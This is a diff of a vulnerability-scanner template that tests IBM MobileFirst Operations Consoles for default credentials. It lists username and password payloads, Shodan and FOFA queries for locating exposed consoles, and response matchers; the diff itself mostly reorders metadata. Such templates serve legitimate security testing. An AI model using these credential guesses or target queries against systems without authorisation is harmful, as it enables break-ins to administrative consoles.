@@ -1,4 +1,5 @@
 id: ibm-mfp-default-login
+
 info:
   name: IBM MobileFirst Foundation - Default Credentials
   author: Vishal Vishwakarma
@@ -13,14 +14,14 @@ info:
     cvss-score: 9.8
     cwe-id: CWE-798
   metadata:
-    runzero-match: any(each(service["html.titles"]), {# matches "(?i)MobileFirst Operations Console"})
-    fofa-query: title="MobileFirst Operations Console"
     max-request: 4
+    verified: true
+    vendor: ibm
     product: mobilefirst-foundation
     shodan-query: http.title:"MobileFirst Operations Console"
-    vendor: ibm
-    verified: true
-  tags: default-login,ibm,mobilefirst
+    fofa-query: title="MobileFirst Operations Console"
+  tags: ibm,mobilefirst,default-login
+
 http:
   - raw:
       - |
@@ -28,6 +29,7 @@ http:
         Host: {{Hostname}}
         Authorization: Basic {{base64(username + ':' + password)}}
         Accept: application/json
+
     payloads:
       username:
         - admin
@@ -41,11 +43,13 @@ http:
         - passw0rd
     attack: pitchfork
     stop-at-first-match: true
+
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
+
       - type: word
         part: body
         words:
@@ -53,14 +57,16 @@ http:
           - "synchronizationStatus"
           - "management-apis"
         condition: and
+
       - type: word
         part: header
         words:
           - "application/json"
+
     extractors:
       - type: regex
         part: body
         group: 1
         regex:
           - '"productVersion"\s*:\s*"([^"]+)"'
-        # digest: 4b0a00483046022100c8ba1431c31eaf60de81866348c430a8e9369f187220d1dd7be7afd29fb426e8022100cc9017dfd7e4bb32a9fae2c82af53c6529d02da0fefe8840a52cd1aebbbf67a4:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a00473045022100ae894e0d7e6e824e564ba2065938bdf7c717710f9a83ee0849931a08ecf37e4602205a6c27eac80f796a83ff6afbd1b85cba25cff9be09d64441e5c9e666f0f23532:922c64590222798bb761d5b6d8e72950
